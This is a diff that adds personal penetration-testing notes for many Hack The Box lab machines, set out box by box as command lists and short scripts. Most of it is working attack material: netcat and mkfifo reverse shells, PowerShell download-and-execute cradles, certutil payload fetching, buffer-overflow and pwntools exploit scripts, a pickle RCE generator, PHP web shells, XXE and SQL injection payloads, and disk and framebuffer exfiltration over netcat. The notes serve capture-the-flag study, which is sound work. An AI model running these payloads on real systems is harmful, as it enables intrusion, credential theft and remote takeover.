@@ -1,0 +1,2016 @@
+__________________________________________________________________________
+
+BOX:BASHED
+
+https://packages.ubuntu.com/search?keywords=apache2		(ubuntu version based upon apache2 version)
+
+(user) may run the following commands:
+    (scriptmanager: scriptmanager) NOPASSWD: ALL		(means we can run any commands as scriptmanager user:group)
+sudo -u scriptmanager bash
+
+__________________________________________________________________________
+
+BOX:NIBBLES
+
+git clone https://github.com/dignajar/nibbleblog.git		(website uses nibbleblog, so we downloaded the latest version,)
+grep -R 4.0.5							(found a file printing version number,)
+http://10.10.10.170/admin/boot/rules/98-constants.bit 		(and checked if that file also existed in the webserver, to concur this is nibbleblog v 4.0.5)
+
+hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/rockyou-50.txt http://10.10.10.170 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect"	(rockyou.txt first 1000 passwords)
+
+ssh -i /falafel/root.key -L:9000:10.10.10.170:80 10.10.10.73		(we have been blacklisted so we proxy request through a webserver to get through it. falafel at 10.10.10.73 is a box we previously rooted)
+
+GIF8;		(add this to the top of php-rev-shell.php as gif magic byte before uploading)
+
+git clone https://github.com/The-Z-Labs/linux-exploit-suggester.git
+./linux_exploit_suggester.sh
+__________________________________________________________________________
+
+BOX:SENSE
+
+gobuster -k 	(skip SSL certification, as the webserver was giving ssl cert error)
+
+echo+$(HOME) (/ character was a bad character in get request command injection exploit, so we used the slash inside env variables)
+echo+$(LANG:13:1)    (same to grab a dash)
+printf "\x45"	     (another replacement for dash, which is another bad character. (octal (55) instead for bsd os))
+
+set Proxies socks5:127.0.0.1:1080
+set ReverseAllowProxies true		(use dynamic proxy with metasploit)
+
+[Brute forcing request that requires CSRF token, as hydra does not support it:]
+import requests
+import re
+re_csrf = 'csrfMagicToken = "(.*?)"'
+s = requests.session()
+lines = open('passwords.txt')
+for password in lines:
+    r = s.post('https://10.10.10.60/index.php', verify=False)
+    csrf = re.findall(re_csrf, r.text)[0]
+    login = {'__csrf_magin':csrf, 'usernamefld':'rohit', 'passwordfld': password, 'login':'login'}
+    r = s.post('https://10.10.10.60/index.php', data=login)
+    if "Dashboard" in r.tex:
+        print("Valid login %s:%s" %('rohit',password))
+    else:
+        print("Failed.")
+
+__________________________________________________________________________
+
+BOX:NODE
+
+gobuster -a 'Mozilla/5.0 (X11; Linux i586; rv:63.0) Gecko/20100101 Firefox/63.0'
+(gobuster was being filtered based on User-Agent so we set a normal user agent)
+
+/assets/js/app/app.js		(enumerate routes of this node application after spidering with burp)
+
+fcrackzip -D -p /usr/share/wordlists/rockyou.txt backup.zip
+
+mongo -p -u mark scheduler	(connect mongo db scheduler)
+db.tasks.insert( { "cmd": "cp /bin/dash /tmp/dash; chmod 6755 /tmp/dash;"} )
+(a bash script was running tasks from mongo db 'scheduler' collection 'tasks', so we setuid dash. we used dash because it retains sticky bits. then we can:)
+/tmp/dash -p
+chown tom:admin /tmp/dash; (we set tom's effective group to admin so he can run admin group allowed scripts)
+
+nc -lvnp 9001 > backup
+nc 10.10.14.3 9001 < /usr/local/bin/backup		[Transfer files using nc]
+strace /usr/local/bin/backup				(trace process calls, similar to deassembling it)
+r2 backup	(deassembler)
+   aaa		(analyze)
+   afl		(functions)
+   vvv		(call graph)
+
+/usr/local/bin/backup "$(printf 'aaa\n/bin/sh\naaa')"		(command injection with new line (NRPE vuln))
+
+gdb ./backup
+	jmpcall		(to check for jump esp vuln)
+
+ldd /usr/local/bin/backup | grep libc.so.6		(grab libc base addr)
+readelf -s /libc/i386-linux-gnu/libc.so.6 | grep -i system (get system@@GLIBC_2.0 address)
+readelf -s /libc/i386-linux-gnu/libc.so.6 | grep -i exit (get exit@@GLIBC_2.0 address)
+strings -atx /libc/i386-linux-gnu/libc.so.6 | grep /bin/sh
+[buff.py:]
+from subprocess import call
+import struct
+libc_base_addr = 0xb75e0000
+system_off = 0x00040310
+exit_off = 0x00033260
+arg_off = 0x08162bacb
+system_addr = struct.pack('<1', libc_base_addr+system_off)
+exit_addr = struct.pack('<1', libc_base_addr+exit_off)
+arg_addr = struct.pack('<1', libc_base_addr+arg_off)
+buf = "A"*512
+buf+= system_addr
+buf+= exit_addr
+buf+= arg_addr
+i=0
+while (i<512):			#try 512 times bc of ASLR protection
+    print 'Try %s' %i
+    i+=1
+    ret = call(["/usr/local/bin/backup","arg1","arg2",buf])
+__________________________________________________________________________
+
+BOX:VALENTINE
+
+ssylyze --heartbleed 10.10.10.79	(ssl vuln scanner, including heartbleed)
+python heartbleed.py -n 100 10.10.10.79		(run the exploit 100 times to catch useful base64 etc data)
+
+tmux -S /.devs/dev_sess			(hop on this root tmux session, which we had group permissions)
+
+[DirtyCow Kernel Exploit]
+https://github.com/dirtycow/dirtycow.github.io/wiki/POCs	(use PTRACE_POKEDATA family for CentOS, /proc/self/mem for Ubuntu)
+gcc -pthread dirty.c -o dirty -lcrypt		(dirtycow kernel exploit, then ssh as firefart root user)
+__________________________________________________________________________
+
+BOX:POISON
+
+GET /browse.php?file=http://10.10.10.14/shell.php
+GET /browse.php?file=ftp://10.10.10.14/shell.php
+GET /browse.php?file=expect://whoami		(trying out different wrappers for php RFI)
+
+[phpinfo.php file upload LFI]
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Files/phpinfolfi.py
+(change payload to php rev shell php, edit REQ1 and LFIREQ to correct phpinfo.php and browse.php paths)
+python lfi.py 10.10.10.14 80
+(in order to troubleshoot any exploit, we can add a listener in burp suite 127.0.0.1:80:10.10.10.14:80, and connect to 127.0.0.1 80 instead when running the  exploit)
+
+ps -auxw | less -w		(line wrap to see the full process path)
+
+ssh -D 1080 -L6801:127.0.0.1:5801 -L6901:127.0.0.1:5901 charix@10.10.10.14	
+(dynamic remote port forwarding to reach active vnc connection found on the box)
+vncviewer -passwd secret.txt 127.0.0.1:6801		(from our kali machine)
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |nc 10.0.0.1 1234 >/tmp/f 	(nc revshell for BSD OS)
+__________________________________________________________________________
+
+BOX:BRAINFUCK
+
+wpscan -u http://brainfuck.htb -enumerate u	(enumerate users)
+
+https://rumkin.com/tools/cipher/
+__________________________________________________________________________
+
+BOX:CRONOS
+
+dig axfr @10.10.10.13 cronos.htb		(as nmap scan showed a dns server)
+
+php /var/www/laravel/artisan schedule:run 	(crontab scheduled laravel command run by root)
+var/www/laravel/app/console/kernel.php:
+    $schedule->exec('chown root:root /tmp/ippsec; chmod 4755 /tmp/ippsec')->everyMinute();		(inside protected function schedule)
+setuid.c:
+int main(void)
+{
+    setuid(0);
+    setgid(0);
+    system('/bin/bash');
+}
+gcc setuid.c -o ippsec
+__________________________________________________________________________
+
+BOX:NINEVEH
+
+hydra https-post-form 		(use this parameter for https webservers instead)
+
+[phpLiteAdmin Exploit:]
+<php echo system($_REQUEST["ippsec"]); ?>	(Create a new table with 1 text field such as this, then rename db to shell.php)
+
+[chrootkit local privesc exploit:]
+vi /tmp/update
+#!/bin/sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+
+binwalk -Me nineveh.png				(image stenography)
+
+[Port Knocking]
+netstat -alnp | grep LIST		(locally showed a listening port 22 that nmap did not find)
+less /etc/init.d/knockd
+less /etc/default/knockd
+less /etc/knockd.conf			(viewing config to find the secret knocking sequence)
+nmap -Pn --host_timeout 201 --max-retries 0 -p 1111 10.10.10.170
+nmap -Pn --host_timeout 201 --max-retries 0 -p 2222 10.10.10.170
+nmap -Pn --host_timeout 201 --max-retries 0 -p 3333 10.10.10.170	(knocking the ports in this seq and ssh will be opened)
+__________________________________________________________________________
+
+BOX:SOLIDSTATE
+
+bash		(just bash to escape rbash)
+
+.\LinEnum.sh -t	(to include thorough test)
+
+os system('chmod 4755 /bin/dash')	(root was running this global writeable file as a cronjob so we setuid /bin/dash. now we can just dash our eUID will be root)
+__________________________________________________________________________
+
+BOX:KOTARAK
+
+wfuzz -c -z range,1-65535 http://10.10.10.55:6000/url.php?path=http://localhost:FUZZ	
+(webserver had a page that was inputting a web page to browse, so we used this to do a local port sweep)
+
+msfvenom -p java/jsp_reverse_tcp LHOST=10.10.14.3 LPORT=9001 -f war > ippsec.war	(to upload as a WAR file to tomcat admin manager, then go to 10.10.10.55/ippsec)
+
+impacket-secretsdump -ntds ntdsgrab.dit -system ntdsgrab.bin LOCAL	(we found this win ntds hive files)
+
+arp -a (to find we are connecting to another machine)
+
+authbind python -m pyftpdlib -p21 -w		(on the compromised box, low ports were not allowed and the wget exploit required for us to run a ftp server so we used authbind)
+authbind python exploit.py
+
+mount					(to find  virtual drive)
+ls -la /dev/mapper/Kotarak--vg-root	(to find out that it's symlinked to dm-0)
+dd if=/dev/dm-0 | gzip -l - | nc 10.10.10.14 80		(send this virtual img to our kali machine)
+mount disk.img /mnt
+cd mnt/var/lib/lxc/kotarak/rootfs		(we were inside of a vm, and this is how we reached to the rootfs)
+__________________________________________________________________________
+
+BOX:TARTARSAUCE
+
+(there is a backup and tar service running as a cronjob, that outputs the diff if any files changed)
+(1.command execution by setuid.c:)
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+int main ( int argc, char *argv[])
+{
+    setreuid(0,0);
+    execve("/bin/sh",NULL,NULL);
+}
+apt install gcc-multilib		(32bit compile compatibility)
+gcc -m32 setuid.c -o setuid		(target system is 32bit so we compile with -m32)
+chmod 6555 setuid
+tar -zcvf setuid.tar.gz var/		(replace the tar that root will untar in 30 seconds)
+(2.file read:)
+ln -s /etc/shadow index.html		(create a symlink for index.html -> /etc/shadow)
+tar -zcvf symlink.tar.gz var/
+
+__________________________________________________________________________
+
+BOX:BLUE
+
+__________________________________________________________________________
+
+BOX:DEVEL
+
+msfvenom -p /windows/meterpreter/reverse_http -f aspx -o aspmeterpretershell.aspx    (generate aspx meterpreter shell)
+
+systeminfo 		(see Hoxfixes/updates for that windows machine)
+
+use post/multi/recon/local_exploit_suggester		(msf local privesc suggester)
+__________________________________________________________________________
+
+BOX:OPTIMUM
+
+tcpdump -i tun0			(receive pings)
+
+[Powershell Nishang Rev Shells]
+cd /opt/powershell/nishang
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.14 -Port 4444		(edit the last line of this script)
+powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/Invoke-PowerShellTcp.ps1')
+
+[Sherlock.ps1 Search for Win Missing Patches]
+wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/refs/heads/master/Sherlock.ps1
+(add Find-AllVulns at the end of the script)
+.\Sherlock.ps1 
+https://github.com/rasta-mouse/Watson.git	(improved new sherlock)
+
+cd /opt/powershell/Empire/data/module_source/privesc/	(Powershell Empire privesc modules)
+
+use post/multi/recon/local_exploit_suggester		(msf local privesc suggester)
+migrate 1788		(migrate to a 64bit process)
+use post/multi/recon/local_exploit_suggester		(and run this again to check 64bit)
+
+__________________________________________________________________________
+
+BOX:BASTARD
+
+(IIS version and corresponding OS version:)
+https://learn.microsoft.com/en-us/lifecycle/products/internet-information-services-iis
+
+git clone https://github.com/SamJoan/droopescan
+./droopescan scan drupal -u 10.10.10.9		(drupal vuln scanner)
+
+. ./PowerUp.ps1
+Invoke-AllChecks				(run all vuln checks on powerup)
+
+nc64.exe -e cmd 10.10.15.1:9001			(win64 netcat revshell)
+
+impacket-smbserver ippsec `pwd`			(start a smb server on your kali machine..)
+net use z: \\10.10.15.1\ippsec
+cp "exploit.exe" z:				(..to serve files to a win machine)
+
+__________________________________________________________________________
+
+BOX:SILO
+
+[Oracle Attack Tool]
+git clone https://github.com/quentinhardy/odat.git
+(and follow installation instructions)
+./odat.py sidguesser -s 10.10.10.82 -p 1521	(enumerate SID)	
+./odat.py passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-files /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt (first sed 's/ /\\//g' to change all spaces to slashes in this userpass file)
+./odat.py utlfile -s 10.10.10.82 -p 1521 --sysdba -d XE -U scott -P tiger --putFile /temp revshell.exe ./revshell.exe
+./odat.py externaltable -s 10.10.10.82 -p 1521 --sysdba -d XE -U scott -P tiger --exec /temp revshell.exe
+(or login to the sql login itself:)
+sqlplus64 scott/tiger@10.10.10.82:1521/XE as sysdba	(login to sql with found creds)
+SQL> select * from session_privs; or select * from user_role_privs;
+     set serveroutput ON
+     declare						(read system files from sql prompt)
+       f utl_file.file_type;
+       s varchar(200);
+     begin
+       f := utl_file.fopen('/root', 'root.txt', 'R');
+       utl_file.get_line(f,s);
+       utl_file.fclose(f);
+       dbms_output.put_line(s);
+     end;
+     /
+sed -z 's/\n//g' cmdasp.aspx | wc -c		(oracle allows lt 1000char files to be uploaded so make it shorter by removing new line, also get rid of comments styling etc)
+     declare						(write system files from sql prompt)
+       f utl_file.file_type;
+       s varchar(5000) := 'CMDASP.ASPX CODE HERE'
+     begin
+       f := utl_file.fopen('/inetpub/wwwroot', 'cmdasp.aspx', 'W');
+       utl_file.put_line(f,s);
+       utl_file.fclose(f);
+     end;
+     /
+
+(Memory Dump)
+apt get install volatility
+volatility -f SILO-20180824.dmp imageinfo		(to get the suggested profile)
+volatility -f SILO-20180824.dmp --profile Win2012R2x64 hashdump
+
+pth-winexe -u Administrator%00000:{NTLMHASHHERE} //10.10.10.82 cmd	(pass the hash)
+__________________________________________________________________________
+
+BOX:BOUNTY
+
+(Aspx Web.Config File Upload RCE)
+https://jaykiee.medium.com/rce-by-uploading-a-web-config-7390e140a45b
+10.10.10.93/UploadedFiles/web.config
+
+[Merlin Exploitation Tool]
+git clone https://github.com/Ne0nd0g/merlin.git
+cd merlin/data/x509 
+openssl req -x509 -newkey rsa:4096 -sha256 -nodes -keyout server.key -out server.crt -subj "/CN=ippsec.rocks" -days 7					(requires a ssl key in this folder to run)
+netstat -alnp | grep 443
+kill -9 1413				(kill if 443 port is busy)
+go run cmd/merlinserver/main.go -i 10.10.14.17		(our kali ip)
+cd /merlin/cmd/merlinagent
+GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=http://10.10.14.17:443" -o agent.exe main.go		
+certutil -urlcache -split -f http://10.10.14.17/agent.exe C:\\Windows\\Temp\\agent.exe && cmd /c C:\\Windows\\Temp\\agent.exe	(download and run merlin agent.exe to the target windows machine to catch it on our merlin listener)
+Merlin > agent list
+	 agent interact bcc0905b
+         cmd whoami /priv
+         upload /root/htb/boxes/bounty/JuicyPotato.exe C:\\users\\public\\jp.exe
+         cmd c:\users\public\jp.exe -t * -p c:\\users\\public\\agent.exe -l 9001
+
+(we opened msf meterpreter session on the target machine, target machine has firewall only allowing loopback for SMB servers)
+meterpreter> portfwd -l 445 -r 127.0.0.1 -p 445
+
+[file upload.py:]
+import requests
+import re
+def TestUpload(filename):
+    url = "http://10.10.10.93/transfer.aspx"
+    burp = {'http':"http://127.0.0.1:8080"}
+    s = requests.session()
+    r = s.get(url)
+    ViewState = re.findall(r'__VIEWSTATE" value="(.*?)"', r.text)[0]
+    EventValidation = re.findall(r'__EVENTVALIDATION" value="(.*?)"', r.text)[0]
+    post_data = {
+        '__VIEWSTATE' : ViewState,
+        '__EVENTVALIDATION' : EventValidation,
+        }
+    uploaded_file = { 'FileUpload1' : (filename, 'Please Subscribe') }
+    r = s.post(url, files=uploaded_file, data=post_data,proxies=burp)
+    return r.text
+for extension in open("extensions.lst",'r'):
+    response = TestUpload('ippsec.'+extension.strip())
+    if "Invalid File" not in response:
+        print(extension)
+__________________________________________________________________________
+
+BOX:JERRY
+
+(msfvenom can create a .war payload for tomcat)
+msfvenom LHOST=10.10.14.3 LPORT=9001 -p /windows/x64/meterpreter/reverse_tcp -f war -o shell.war
+unzip shell.war			(to find .jsp file that is uploaded)
+10.10.50.168/shell/u76sbhb.jsp
+
+(jsp shell:)
+https://github.com/SecurityRiskAdvisors/cmd.jsp
+python3 -m SimpleHTTPServer 80 				(to host a.jsp)
+<script src="http://10.10.14.3/a.js">>			(edit cmd.jsp)
+zip cmd.war cmd.jsp					(zip to a war file)
+(and upload this war)
+__________________________________________________________________________
+
+BOX:JEEVES
+
+[Jenkins > Manage Jenkins > Script Console Groovy Code Execution]
+cmd = """ powershell 'IEX(New-Object Net.WebClient).downloadString('http:/10.10.14.3/resv.ps1')" """
+cmd.execute().text
+
+winexe -U jenkins/administrator //10.10.10.63 cmd.exe		(remote login with password)(psexec for linux)
+pth-winexe -U jenkins/administrator //10.10.10.63 cmd.exe	(remote login with hash)
+
+dir /r		(to see alternate file streams to find hidden file)
+powershell Get-Content hm.txt -Stream root.txt
+
+meterpreter> execute -cH -f rottenpotato.exe		(execute exploit.exe from meterpreter session)
+meterpreter> load incognito
+meterpreter> list tokens			(load incognito extension to use tokens created by rotten potato)
+meterpreter> impersonate_token "NT AUTHORITY\\SYSTEM"
+__________________________________________________________________________
+
+BOX:BART
+
+(JAWS Windows Enumeration Script)
+cp /opt/powershell/JAWS/jaws-enum.ps1 .
+.\jaws-enum.ps1
+
+(Administrator Auto-Login Registry Password Fetch)
+. ./PowerUp.ps1
+Get-RegistryAutoLogon		(needs shell process to be 64 bit if sys is 64 bit)
+GET /log.php?cmd=C:\Windows\SysNative\WindowsPowerShell\v1.0\Powershell 'IEX(New-Object Net.WebClient)).downloadString('http://10.10.14.3/shell.ps1')"		(get a shell as a 64bit process)
+cp /opt/powershell/PowerShell-Suite/Invoke-Runas.ps1 .		(if we have a pass for a priviledged password, but we have a terminal shell, we cannot runas directly)
+Invoke-RunAs -User Administrator -Password Password123 -LogonType 0x1 -Binary powershell.exe -Args 'IEX(New-Object Net.WebClient)).downloadString('http://10.10.14.3/shell.ps1')"
+(he puts the ps1 run example usage to the end of the ps1 script, so they all automatically run after downloading)
+
+use exploit/smb/smb_delivery				(serves payloads from an smb server)
+rundll32.exe \\10.10.14.30\share\test.dll,0		(it will ask to run this command at the target)
+post/windows/gather/credentials/windows_autologin	(gather autologin credentials from msf)
+use post/windows/manage/run_as				(RunAs in msf)
+use exploit/windows/smb/psexec				(or remote login with psexec over msf)
+smbexec.py Administrator:Password123@10.10.10.170	(or remote login with smbexec)
+
+hashcat -m 1410 hashes.txt /opt/wordlists/Rockyou.txt (wc -c shows 64 possibly for SHA256, we found the salt inside the php code. pay attention if it is salt then pass or pass then salt for the correct mode - $passwd.$salt in the code. text file PASSWORD:SALT)
+
+__________________________________________________________________________
+
+BOX:TALLY
+
+/usr/share/wordlists/SecLists/Discovery/Web_Content/sharepoint.txt (MS Sharepoint server specific wordlist)
+10.10.10.59/_layouts/viewlsts.aspx (default path for site contents sharepoint)
+
+wget --mirror ftp://tim:Password123@tally.htb.local		(download entire ftp server to your kali)
+mount -t cifs -o username=tim //10.10.10.59/ACCT /mnt/smb 	(mount entire smb share to your kali. might need to sudo apt install cifs-utils)
+mount -t cifs -o 'username=r.thompson,password=welcome2019' //10.10.10.59/r.thompson /mnt/r.thompson 
+
+git clone https://github.com/Genetic-Malware/Ebowla.git
+python ebowla.py payload.exe genetic.config		(AV evasion tool)
+./build_x64_go.sh output/go_symmetric_payload.exe.go ebowla-payload.exe
+
+cd C:\FTP\		(find the ftp directory after uploading files to it)
+
+(Compiling MS Kernel Exploit in Our Windows Machine)
+C:\Program Files (x86)\Microsoft Visual Studio 14.0\VC>vsvarsall.bat amd64
+(go to CVE-2017-0213.cpp to change payload from cmd.exe to a revshell.exe
+also add #pragma comment(lib, "Advapi32.lib"))
+cl CVE-2017-0213.cpp /EHsc /DUNICODE /D_UNICODE (to fix WCHAR compile errors)
+migrate 612		(migrate to an interactive process to use this exploit)
+.\CVE-2017-0213.exe
+
+[HTML Rev Shell]
+(there was an user clicking index.html periodically so we changed index.html:)
+<html>
+<meta http-equiv="refresh" content="0; URL='http://10.10.14.2/ffexploit.html'" />
+</html>
+(ffexploit.html is a Firefox v44 exploit, as we found this version of firefox in the box)
+
+(Edit Assembly code in the exploit to get a rev shell instead of calc.exe)
+cmd="powershell(IEX(IWR('http://10.10.14.2/revshell.ps1'))"
+for i in range(len(cmd),0,-4)):
+    print cmd[i-4:i].encode('hex')
+#then add \x68 beginning of each line and \x for each 2 characters
+
+__________________________________________________________________________
+
+BOX:ACTIVE
+
+dnsrecon -d 10.10.10.100 -r 10.0.0.0/8		(recon for entire AD domain, as well as find out hostname)
+
+nmap --script safe -p 445 10.10.10.100          (run all safe scripts on smb instead of picking scripts)
+
+\\active.htb\Policies\{6AC-01F-F9}\MACHINE\Preferences\Groups\Groups.xml (old policy file which can have creds in it)
+gpp-decrypt edBSHO/Nglvmq		(to decrypt group policy password)
+
+[SMBMAP]
+smbmap -H 10.10.10.100			(list shares and their access)
+smbmap -R Replication -H 10.10.10.100	(list contents of the directory)
+smbmap -R Replication -H 10.10.10.100 -A Groups.xml	(download the file then locate to find it)
+
+[Enumerate AD Users]		
+cd /opt/Impacket
+GetADUsers.py -all -dc-ip 10.10.10.100 active.htb/svc_tgs (we have svc_tgs creds)
+
+runas /netonly /user:active.htb\svc_tgs cmd		(remote login from your own windows box, to a domain user of the target machine with password)
+.\SharpHound.exe -c all -d active.htb --domaincontroller 10.10.10.100 (then run sharphound on this remote)
+
+[Kerberoasting]
+cd /opt/Impacket
+GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs (we have svc_tgs creds. this gives Kerberoasting hashes for admin user directly.)
+__________________________________________________________________________
+
+BOX:JAIL
+
+[shell code in hex:]
+https://shell-storm.org/shellcode/files/shellcode-833.html
+[socket reuse shellcode if there is a firewall]
+https://www.exploit-db.com/exploits/34060
+[exploit.py]
+from pwn import *
+context(os="linux",arch="i386")
+HOST, PORT = "192.168.101.142", 7411
+junk= "AAAAA..AAAAAA" 	   #until control of EIP when examined with pattern create
+buf= "SHELLCODE IN HEX GOES HERE FOR REV SHELL"
+mem=p32(0xffebb890+32)     #mem addr of input buffer+28 bytes of junk+4 bytes of mem
+p=remote(HOST,PORT)	   #binary to be exploited is in port 7411
+p.recvuntil("OK Ready. Send USER command.")
+p.sendline("USER admin")
+p.recvuntil("OK. Send PASS command.")
+p.sendline("PASS"+junk+mem+buf)
+p.interactive()
+
+[SELinux sandbox escape]
+(userid shows nobody in centos)
+https://seclists.org/oss-sec/2016/q3/606
+
+[nfs exploitation]
+showmount -e 10.10.10.34		(nfs v3 port is open)
+mkdir /mnt/jail/nfsshare
+mount -t nfs -o vers=3 10.10.10.34:/nfsshare /mnt/jail/nfsshare
+ls -la			(shows gid 1000 write access)
+sudo vi /etc/passwd     (change our kali user's id to 1000:1000)
+sudo vi /etc/group	(change our kali user's gid to 1000)
+(create setuid.c in the same dir from kali: and then compile)
+#include <stdio.h>
+#include <unistd.h> 
+int main(int argc, const char * argv[]) {
+    if (argc > 1) printf("%s", execvp(argv[1], &argv[1]));
+    return 0;
+}
+chmode 6755 setuid
+(or use SELinux sandbox exploit above if SELinux)
+
+:python import pty;pty.spawn("/bin/bash")	(vim/rvim/vi/less had sudo priv to edit a file)
+
+https://quipqiup.com/		(cypher solver)
+
+rar2john keys.rar		(encrypted rar file johntheripper)
+
+./hashcat --stdout -a 3 Morris19?d?d?s	> /root/jail.words	(create a wordlist with hashcat with 2 digits and 1 symbol)
+
+/opt/RsaCtfTool/RsaCtfTool.py --publickey rootkey.pub --private		(recover private key from the public rsa key)
+__________________________________________________________________________
+
+BOX:FALAFEL
+
+sqlmap -r login.req --string "Password is incorrect for this user" -p username,password  		(string parameter tells sqlmap that with correct injection we will get this in the response)
+
+[PHP type juggling 0e hash collision]
+(we notice admin hash starts with 0e, which then we can use any 0e hash collision password instead of admin's password. 240610708 for example)
+
+python -m pyftplib -p21 -w		(start ftp server)
+
+(php file upload max file size exploitation)
+(server was giving error file name too long 240 total. the file upload was changing extensions to .gif from .php. we created a php shell file with 232 A's, .php.gif and then it shortened it to .php)
+
+(GROUP VIDEO EXPLOIT MONITOR)
+(we were part of the group video and saw a physically logged in user - to tty1)
+nc -lvnp 9000 > fb.raw
+cat /dev/fb0 > /dev/tcp/10.10.14.30/9000
+cat /sys/class/graphics/fb0/virtual_size	(get resolution from target machine)
+(open with gimp, setting the correct resolution)
+
+(Group Disk)
+(user was a part of group disk, which has access to all disks)
+debugfs /dev/sda1
+        cat root/.ssh/id_rsa		(then we can ssh as root)
+
+(sql boolean injection with known user with injectable username field)
+(bruteforce password char by char)
+username=admin' and substr(password,1,1) = '0'-- -&password=pass
+username=admin' and substr(password,2,1) = 'e'-- -&password=pass
+[sqlinject.py:]
+import requests
+chars =['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e',f']	  #pass was md5 hash
+def GetSQL(i,c):
+    return "admin' and substr(password,%s,1) = %s'-- -" %(i,c)
+for i in range(1,33):
+    for c in chars:
+        injection = GetSQL(i,c)
+        payload={'username':injection, 'password':'anything'}
+        r = requests.post('http://10.10.10.73/login.php', data=payload)
+        if "Wrong password for this user" in r.text:
+            print(c,end='',flush=True)
+            break
+__________________________________________________________________________
+
+BOX:DEVOOPS
+
+(we used this xml xxe payload but modified for the python server)
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data (ANY)>
+<!ENTITY file SYSTEM "/etc/passwd">
+]>
+<data>&file;</data>		(conform this to the actual expected xml structure instead of data)
+
+[PICKLE exploit]
+(exposed sourcecode revealed pickle. below code creates a b64 encoded pickle exploit)
+(Content-Type of the exploited request must be text)
+import pickle
+from base64 import urlsafe_b64encode as b64encode
+RUNME = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"""
+class ippsec(object):
+    def __reduce__(self):
+        import os
+        return (os.system,(RUNME,))
+print(b64encode(pickle.dumps(ippsec())))
+
+git log				     (view git commit history inside .git directory)
+git diff 27ca7d8ca78ba872bbc772db80  (found an accidentally uploaded and reverted commit with creds)
+
+__________________________________________________________________________
+
+BOX:HAWK
+
+https://launchpad.net/ubuntu/+source/openssh	(enumerate ubuntu v from openssh v)
+
+dir -a 		(ftp view hidden files)
+
+(crack openssl salted encrypted file)
+apt install bruteforce-salted-openssl
+bruteforce-salted-openssl -t 10 -f  /usr/share/Rockyou.txt -C aes-256-cbc -d sha256 encrypted.txt
+openssl enc -d -in encrypted.txt -out decrypted -k Password123 -aes-256-cbc
+
+(H2 console SQL RCE)
+https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html
+__________________________________________________________________________
+
+BOX:CONCEAL
+
+(all ports were filtered so we did some manual snmp enum)
+snmpwalk -c public -v2c 10.10.10.166 	(gives IKE VPN password PSK)
+hashes.org				(crack it)
+snmp-check 10.10.10.166
+(VPN)
+ike-scan 10.10.10.166 -h -M
+apt install strongswan		(IPSEC VPN cli)
+vi /etc/ipsec.secrets
+    10.10.10.116 %any : PSK "Dudecake1"
+vi /etc/ipsec.conf
+    conn Conceal
+      type=transport
+      keyexchange=ikev1
+      left=10.10.14.3
+      leftprotoport=tcp		(vpn is only filtering tcp connections)
+      right=10.10.10.116
+      rightprotoport=tcp
+      authby=psk
+      esp=3des-sha1		(we got all these info from ikescan)
+      ike=3des-sha1-modp1024
+      ikelifetime=8h
+      fragmentation=yes
+      auto=start
+ifconfig tun0 mtu 1000
+ipsec start --nofork
+nmap -sT -sC -sV 10.10.10.116	(vpn only works with -sT scan. now we can run this scan.)
+
+mv test.aspx test.asp		(.aspx extension gave error, so we tried this one)
+
+(cpp c++ reverse shell)
+https://github.com/tudorthe1ntruder/reverse-shell-poc/blob/master/rs.c
+x86_64-w64-mingw32-g++ rev.cpp -o rev.dll -lws2_32 -shared
+__________________________________________________________________________
+
+BOX:NETMON
+
+[WINDOWS USEFUL OR JUICY FILES LIST]
+https://gist.github.com/korrosivesec/a339e376bae22fcfb7f858426094661e
+C:\Windows\Logs\WindowsUpdate.log
+
+nc -lvnp 80			(trying change revshell port to 80 just in case there is a firewall rule)
+
+__________________________________________________________________________
+
+BOX:FRIENDZONE
+
+smbmap -H 10.10.10.123 -R --depth 5		(recursively list the smb shares)
+
+(dns zone transfer)
+(each of these gave different pages/subdomains)
+dig axfr @10.10.10.123 friendzone.red
+dig axfr @10.10.10.123 friendzoneportal.red
+http://friendzone.red
+https://friendzone.red
+http://friendzoneportal.red
+https://friendzoneportal.red
+
+vi /usr/lib/python2.7/os.py		(there was a cronjob py script that was importing os and this python library file was writeable for some reason)
+__________________________________________________________________________
+
+BOX:LACASADEPAPEL
+
+searchsploit vsftpd 2.3.4		(this version has a backdoor)
+nc 10.10.10.131 21
+USER ippsec:)
+PASS ippsec
+nc 10.10.10.131 6200			(uname includes a smiley, this port opens)
+
+[php interactive shell commands]
+(we drop to a php interactive shell unexpectedly..)
+system("ping 10.10.14.3")
+shell_exec("ping 10.10.14.3")
+scandir("/home")
+file_get_contents("/home/berlin/server.js")
+file_put_contents('/home/dali/.ssh/authorized_keys','ssh-rsa AAA..ourPublicKeyGeneratedBySshKeyGenHere.. root@htb', FILE_APPEND)
+
+[Certificate Chaining]
+(after finding a private ca.key and seeing the webserver asks for a certificate)
+openssl genrsa -out client.key 4096
+openssl req -new -key -client.key -out client.csr
+openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -set_serial 9001 -extensions client -days 9002
+openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
+
+(there was LFI and the files were being base64 encrypted)
+echo -n ../.ssh/id_rsa | base64
+http://lacasadepapel.htb/file/L4vLnNAZF92E=
+
+(there is a root owned cron job that runs memcached.ini. even though we cannot edit this root owned file, if it's in our own owned directory we can still delete or rename it)
+mv memcached.ini memcached.ini.bak
+vi memcached.ini 	(and write bash revshell)
+__________________________________________________________________________
+
+BOX:LIGHTWEIGHT
+
